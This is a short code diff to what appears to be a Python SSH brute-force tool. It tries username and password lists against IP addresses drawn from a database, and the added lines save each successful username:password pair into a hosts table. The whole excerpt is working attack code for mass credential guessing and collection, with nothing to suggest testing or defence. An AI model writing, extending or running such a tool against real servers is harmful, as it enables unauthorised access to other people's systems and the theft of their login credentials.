@@ -60,6 +60,9 @@ class SSHConnectionThread(threading.Thread):
                             try:
                                 client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
                                 print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
+                                cur = conn.cursor()
+                                cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
+                                conn.commit()
                             except paramiko.AuthenticationException:
                                 # Incorrect credentials, continue to the next one
                                 break
@@ -90,6 +93,7 @@ class SSHConnectionThread(threading.Thread):
             except Exception as e:
                 print(f"{RED}Error occurred while processing {ip_address}: {str(e)}")
             self.queue.task_done()
+
 
 def main(username_file, password_file):
     # Fetch the IP addresses from the database
